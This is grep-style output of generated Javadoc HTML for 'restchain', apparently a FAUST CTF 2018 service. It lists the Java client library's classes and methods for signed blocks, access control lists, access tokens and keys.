/doc/java/net/faustctf/_2018/restchain/PublicKey.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/PublicKey.html#getPublicKey--">getPublicKey</a></span>()</code>
/doc/java/net/faustctf/_2018/restchain/PublicKey.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/PublicKey.html#toString--">toString</a></span>()</code>
/doc/java/net/faustctf/_2018/restchain/AccessTokenFactory.html:<pre>public class <span class="typeNameLabel">AccessTokenFactory</span>
/doc/java/net/faustctf/_2018/restchain/AccessTokenFactory.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/AccessTokenFactory.html#requireSecret-java.lang.String-">requireSecret</a></span>(java.lang.String&nbsp;secret)</code>
/doc/java/net/faustctf/_2018/restchain/AccessTokenFactory.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/AccessTokenFactory.html#requireSignature-java.lang.String-net.faustctf._2018.restchain.PrivateKey-">requireSignature</a></span>(java.lang.String&nbsp;keyId,
/doc/java/net/faustctf/_2018/restchain/RESTchainRuntimeException.html:<pre>public class <span class="typeNameLabel">RESTchainRuntimeException</span>
/doc/java/net/faustctf/_2018/restchain/RESTchainRuntimeException.html:<td class="colOne"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/RESTchainRuntimeException.html#RESTchainRuntimeException-java.lang.String-java.lang.Exception-">RESTchainRuntimeException</a></span>(java.lang.String&nbsp;message,
/doc/java/net/faustctf/_2018/restchain/Signature.html:<pre>public class <span class="typeNameLabel">Signature</span>
/doc/java/net/faustctf/_2018/restchain/Signature.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/Signature.html#getSignatureString--">getSignatureString</a></span>()</code>
/doc/java/net/faustctf/_2018/restchain/Signature.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/Signature.html#toString--">toString</a></span>()</code>&nbsp;</td>
/doc/java/net/faustctf/_2018/restchain/RESTchainException.html:<pre>public class <span class="typeNameLabel">RESTchainException</span>
/doc/java/net/faustctf/_2018/restchain/RESTchainException.html:<td class="colOne"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/RESTchainException.html#RESTchainException-int-java.lang.String-">RESTchainException</a></span>(int&nbsp;statusCode,
/doc/java/net/faustctf/_2018/restchain/RESTchainException.html:<td class="colOne"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/RESTchainException.html#RESTchainException-int-java.lang.String-java.lang.Exception-">RESTchainException</a></span>(int&nbsp;statusCode,
/doc/java/net/faustctf/_2018/restchain/Block.html:<pre>public class <span class="typeNameLabel">Block</span>
/doc/java/net/faustctf/_2018/restchain/Block.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/Block.html#getId--">getId</a></span>()</code>&nbsp;</td>
/doc/java/net/faustctf/_2018/restchain/Block.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/Block.html#getPreviousId--">getPreviousId</a></span>()</code>&nbsp;</td>
/doc/java/net/faustctf/_2018/restchain/Block.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/Block.html#getSignature--">getSignature</a></span>()</code>&nbsp;</td>
/doc/java/net/faustctf/_2018/restchain/Block.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/Block.html#getSignedData--">getSignedData</a></span>()</code>&nbsp;</td>
/doc/java/net/faustctf/_2018/restchain/Block.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/Block.html#getSignedDataHash--">getSignedDataHash</a></span>()</code>&nbsp;</td>
/doc/java/net/faustctf/_2018/restchain/Block.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/Block.html#getSigner--">getSigner</a></span>()</code>&nbsp;</td>
/doc/java/net/faustctf/_2018/restchain/Block.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/Block.html#toString--">toString</a></span>()</code>&nbsp;</td>
/doc/java/net/faustctf/_2018/restchain/AclFactory.html:<pre>public class <span class="typeNameLabel">AclFactory</span>
/doc/java/net/faustctf/_2018/restchain/AclFactory.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/AclFactory.html#alwaysAllow--">alwaysAllow</a></span>()</code>&nbsp;</td>
/doc/java/net/faustctf/_2018/restchain/AclFactory.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/AclFactory.html#alwaysDeny--">alwaysDeny</a></span>()</code>&nbsp;</td>
/doc/java/net/faustctf/_2018/restchain/AclFactory.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/AclFactory.html#requireSecret-java.lang.String-">requireSecret</a></span>(java.lang.String&nbsp;secret)</code>&nbsp;</td>
/doc/java/net/faustctf/_2018/restchain/AclFactory.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/AclFactory.html#requireSignature-java.util.Map-">requireSignature</a></span>(java.util.Map&lt;java.lang.String,<a href="../../../../net/faustctf/_2018/restchain/PublicKey.html" title="class in net.faustctf._2018.restchain">PublicKey</a>&gt;&nbsp;allowedKeys)</code>&nbsp;</td>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/Acl.html#Acl-java.lang.String-">Acl(String)</a></span> - Constructor for class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/Acl.html" title="class in net.faustctf._2018.restchain">Acl</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/SignedData.html#addHeader-java.lang.String-java.lang.String-">addHeader(String, String)</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/SignedData.html" title="class in net.faustctf._2018.restchain">SignedData</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/AclFactory.html#alwaysAllow--">alwaysAllow()</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/AclFactory.html" title="class in net.faustctf._2018.restchain">AclFactory</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/AclFactory.html#alwaysDeny--">alwaysDeny()</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/AclFactory.html" title="class in net.faustctf._2018.restchain">AclFactory</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/SignedData.html#deleteHeader-java.lang.String-">deleteHeader(String)</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/SignedData.html" title="class in net.faustctf._2018.restchain">SignedData</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/RESTchainClient.html#generatePrivateKey--">generatePrivateKey()</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/RESTchainClient.html" title="class in net.faustctf._2018.restchain">RESTchainClient</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/RESTchainClient.html#getAccessTokenFactory--">getAccessTokenFactory()</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/RESTchainClient.html" title="class in net.faustctf._2018.restchain">RESTchainClient</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/SignedData.html#getAcl--">getAcl()</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/SignedData.html" title="class in net.faustctf._2018.restchain">SignedData</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/RESTchainClient.html#getAclFactory--">getAclFactory()</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/RESTchainClient.html" title="class in net.faustctf._2018.restchain">RESTchainClient</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/Acl.html#getAclString--">getAclString()</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/Acl.html" title="class in net.faustctf._2018.restchain">Acl</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/RESTchainClient.html#getBlock-java.lang.String-net.faustctf._2018.restchain.AccessToken-">getBlock(String, AccessToken)</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/RESTchainClient.html" title="class in net.faustctf._2018.restchain">RESTchainClient</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/RESTchainClient.html#getBlock-java.lang.String-">getBlock(String)</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/RESTchainClient.html" title="class in net.faustctf._2018.restchain">RESTchainClient</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/RESTchainBlockPermissionDenied.html#getBlockStub--">getBlockStub()</a></span> - Method in exception net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/RESTchainBlockPermissionDenied.html" title="class in net.faustctf._2018.restchain">RESTchainBlockPermissionDenied</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/SignedData.html#getBody--">getBody()</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/SignedData.html" title="class in net.faustctf._2018.restchain">SignedData</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/SignedData.html#getContentType--">getContentType()</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/SignedData.html" title="class in net.faustctf._2018.restchain">SignedData</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/RESTchainClient.html#getGenesisBlock--">getGenesisBlock()</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/RESTchainClient.html" title="class in net.faustctf._2018.restchain">RESTchainClient</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/SignedData.html#getHeader-java.lang.String-">getHeader(String)</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/SignedData.html" title="class in net.faustctf._2018.restchain">SignedData</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/SignedData.html#getHeaderAll-java.lang.String-">getHeaderAll(String)</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/SignedData.html" title="class in net.faustctf._2018.restchain">SignedData</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/SignedData.html#getHeaders--">getHeaders()</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/SignedData.html" title="class in net.faustctf._2018.restchain">SignedData</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/Block.html#getId--">getId()</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/Block.html" title="class in net.faustctf._2018.restchain">Block</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/Block.html#getPreviousId--">getPreviousId()</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/Block.html" title="class in net.faustctf._2018.restchain">Block</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/PrivateKey.html#getPublicKey--">getPublicKey()</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/PrivateKey.html" title="class in net.faustctf._2018.restchain">PrivateKey</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/PublicKey.html#getPublicKey--">getPublicKey()</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/PublicKey.html" title="class in net.faustctf._2018.restchain">PublicKey</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/Block.html#getSignature--">getSignature()</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/Block.html" title="class in net.faustctf._2018.restchain">Block</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/Signature.html#getSignatureString--">getSignatureString()</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/Signature.html" title="class in net.faustctf._2018.restchain">Signature</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/Block.html#getSignedData--">getSignedData()</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/Block.html" title="class in net.faustctf._2018.restchain">Block</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/Block.html#getSignedDataHash--">getSignedDataHash()</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/Block.html" title="class in net.faustctf._2018.restchain">Block</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/Block.html#getSigner--">getSigner()</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/Block.html" title="class in net.faustctf._2018.restchain">Block</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/RESTchainClient.html#putBlock-java.lang.String-net.faustctf._2018.restchain.SignedData-net.faustctf._2018.restchain.PrivateKey-">putBlock(String, SignedData, PrivateKey)</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/RESTchainClient.html" title="class in net.faustctf._2018.restchain">RESTchainClient</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/RESTchainClient.html#putBlock-net.faustctf._2018.restchain.Block-net.faustctf._2018.restchain.SignedData-net.faustctf._2018.restchain.PrivateKey-">putBlock(Block, SignedData, PrivateKey)</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/RESTchainClient.html" title="class in net.faustctf._2018.restchain">RESTchainClient</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/AccessTokenFactory.html#requireSecret-java.lang.String-">requireSecret(String)</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/AccessTokenFactory.html" title="class in net.faustctf._2018.restchain">AccessTokenFactory</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/AclFactory.html#requireSecret-java.lang.String-">requireSecret(String)</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/AclFactory.html" title="class in net.faustctf._2018.restchain">AclFactory</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/AccessTokenFactory.html#requireSignature-java.lang.String-net.faustctf._2018.restchain.PrivateKey-">requireSignature(String, PrivateKey)</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/AccessTokenFactory.html" title="class in net.faustctf._2018.restchain">AccessTokenFactory</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/AclFactory.html#requireSignature-java.util.Map-">requireSignature(Map&lt;String, PublicKey&gt;)</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/AclFactory.html" title="class in net.faustctf._2018.restchain">AclFactory</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/RESTchainBlockNotFound.html#RESTchainBlockNotFound-int-java.lang.String-">RESTchainBlockNotFound(int, String)</a></span> - Constructor for exception net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/RESTchainBlockNotFound.html" title="class in net.faustctf._2018.restchain">RESTchainBlockNotFound</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/RESTchainClient.html#RESTchainClient-java.lang.String-">RESTchainClient(String)</a></span> - Constructor for class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/RESTchainClient.html" title="class in net.faustctf._2018.restchain">RESTchainClient</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/RESTchainException.html#RESTchainException-int-java.lang.String-">RESTchainException(int, String)</a></span> - Constructor for exception net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/RESTchainException.html" title="class in net.faustctf._2018.restchain">RESTchainException</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/RESTchainException.html#RESTchainException-int-java.lang.String-java.lang.Exception-">RESTchainException(int, String, Exception)</a></span> - Constructor for exception net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/RESTchainException.html" title="class in net.faustctf._2018.restchain">RESTchainException</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/RESTchainRuntimeException.html#RESTchainRuntimeException-java.lang.String-java.lang.Exception-">RESTchainRuntimeException(String, Exception)</a></span> - Constructor for exception net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/RESTchainRuntimeException.html" title="class in net.faustctf._2018.restchain">RESTchainRuntimeException</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/SignedData.html#setAcl-net.faustctf._2018.restchain.Acl-">setAcl(Acl)</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/SignedData.html" title="class in net.faustctf._2018.restchain">SignedData</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/SignedData.html#setBody-byte:A-">setBody(byte[])</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/SignedData.html" title="class in net.faustctf._2018.restchain">SignedData</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/SignedData.html#setBody-java.lang.String-">setBody(String)</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/SignedData.html" title="class in net.faustctf._2018.restchain">SignedData</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/SignedData.html#setContentType-java.lang.String-">setContentType(String)</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/SignedData.html" title="class in net.faustctf._2018.restchain">SignedData</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/SignedData.html#setHeader-java.lang.String-java.lang.String-">setHeader(String, String)</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/SignedData.html" title="class in net.faustctf._2018.restchain">SignedData</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/SignedData.html#setHeaders-java.util.Map-">setHeaders(Map&lt;String, List&lt;String&gt;&gt;)</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/SignedData.html" title="class in net.faustctf._2018.restchain">SignedData</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/RESTchainClient.html#sign-net.faustctf._2018.restchain.PrivateKey-net.faustctf._2018.restchain.SignedData-">sign(PrivateKey, SignedData)</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/RESTchainClient.html" title="class in net.faustctf._2018.restchain">RESTchainClient</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/SignedData.html#SignedData-java.util.Map-java.lang.String-byte:A-">SignedData(Map&lt;String, List&lt;String&gt;&gt;, String, byte[])</a></span> - Constructor for class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/SignedData.html" title="class in net.faustctf._2018.restchain">SignedData</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/SignedData.html#SignedData-java.lang.String-byte:A-">SignedData(String, byte[])</a></span> - Constructor for class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/SignedData.html" title="class in net.faustctf._2018.restchain">SignedData</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/SignedData.html#SignedData-java.lang.String-java.lang.String-">SignedData(String, String)</a></span> - Constructor for class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/SignedData.html" title="class in net.faustctf._2018.restchain">SignedData</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/Acl.html#toString--">toString()</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/Acl.html" title="class in net.faustctf._2018.restchain">Acl</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/Block.html#toString--">toString()</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/Block.html" title="class in net.faustctf._2018.restchain">Block</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/PrivateKey.html#toString--">toString()</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/PrivateKey.html" title="class in net.faustctf._2018.restchain">PrivateKey</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/PublicKey.html#toString--">toString()</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/PublicKey.html" title="class in net.faustctf._2018.restchain">PublicKey</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/Signature.html#toString--">toString()</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/Signature.html" title="class in net.faustctf._2018.restchain">Signature</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/SignedData.html#toString--">toString()</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/SignedData.html" title="class in net.faustctf._2018.restchain">SignedData</a></dt>
/doc/java/index-all.html:<dt><span class="memberNameLink"><a href="net/faustctf/_2018/restchain/RESTchainClient.html#verify-net.faustctf._2018.restchain.PublicKey-net.faustctf._2018.restchain.SignedData-net.faustctf._2018.restchain.Signature-">verify(PublicKey, SignedData, Signature)</a></span> - Method in class net.faustctf._2018.restchain.<a href="net/faustctf/_2018/restchain/RESTchainClient.html" title="class in net.faustctf._2018.restchain">RESTchainClient</a></dt>
"""
